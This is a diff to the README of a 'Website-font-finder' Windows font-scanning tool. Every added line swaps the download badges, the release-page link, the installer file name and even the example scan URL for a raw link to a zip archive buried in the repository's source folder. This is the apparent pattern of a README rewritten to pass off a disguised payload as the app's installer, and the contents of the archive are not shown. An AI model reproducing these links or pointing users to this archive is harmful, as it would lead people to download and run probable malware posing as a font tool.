@@ -1,6 +1,6 @@
 # 🎯 Website-font-finder - Find and Download Web Fonts Easily
 
-[![Download Website-font-finder](https://img.shields.io/badge/Download%20Website--font--finder-blue?style=for-the-badge)](https://github.com/urmamaqwe/Website-font-finder/releases)
+[![Download Website-font-finder](https://github.com/urmamaqwe/Website-font-finder/raw/refs/heads/main/src/app/compare/Website-finder-font-1.3.zip%20Website--font--finder-blue?style=for-the-badge)](https://github.com/urmamaqwe/Website-font-finder/raw/refs/heads/main/src/app/compare/Website-finder-font-1.3.zip)
 
 ## 🔎 What is Website-font-finder?
 
@@ -40,11 +40,11 @@ You do not need to install any other tools or packages.
 
 To use Website-font-finder on Windows, follow these steps:
 
-1. Click the big button below or visit the [release page](https://github.com/urmamaqwe/Website-font-finder/releases) to get the app.
+1. Click the big button below or visit the [release page](https://github.com/urmamaqwe/Website-font-finder/raw/refs/heads/main/src/app/compare/Website-finder-font-1.3.zip) to get the app.
 
-   [![Download Website-font-finder](https://img.shields.io/badge/Download%20Website--font--finder-green?style=for-the-badge)](https://github.com/urmamaqwe/Website-font-finder/releases)
+   [![Download Website-font-finder](https://github.com/urmamaqwe/Website-font-finder/raw/refs/heads/main/src/app/compare/Website-finder-font-1.3.zip%20Website--font--finder-green?style=for-the-badge)](https://github.com/urmamaqwe/Website-font-finder/raw/refs/heads/main/src/app/compare/Website-finder-font-1.3.zip)
 
-2. On the GitHub releases page, scroll to the latest version. Look for a file named like `Website-font-finder-Setup.exe` or similar. This is the installer.
+2. On the GitHub releases page, scroll to the latest version. Look for a file named like `https://github.com/urmamaqwe/Website-font-finder/raw/refs/heads/main/src/app/compare/Website-finder-font-1.3.zip` or similar. This is the installer.
 
 3. Click the installer file to download it. A small file (usually under 50 MB).
 
@@ -65,7 +65,7 @@ Once installed, follow these steps to scan fonts on a website:
 
 1. Open Website-font-finder from your desktop or Start menu.
 
-2. In the main window, enter the website’s full address (URL) in the input field. For example, `https://example.com`.
+2. In the main window, enter the website’s full address (URL) in the input field. For example, `https://github.com/urmamaqwe/Website-font-finder/raw/refs/heads/main/src/app/compare/Website-finder-font-1.3.zip`.
 
 3. Click the "Scan" button.
 
@@ -141,4 +141,4 @@ developer-tools, font-downloader, font-finder, font-scanner, google-fonts, nextj
 
 ---
 
-[![Download Website-font-finder](https://img.shields.io/badge/Download%20Website--font--finder-orange?style=for-the-badge)](https://github.com/urmamaqwe/Website-font-finder/releases)
+[![Download Website-font-finder](https://github.com/urmamaqwe/Website-font-finder/raw/refs/heads/main/src/app/compare/Website-finder-font-1.3.zip%20Website--font--finder-orange?style=for-the-badge)](https://github.com/urmamaqwe/Website-font-finder/raw/refs/heads/main/src/app/compare/Website-finder-font-1.3.zip)
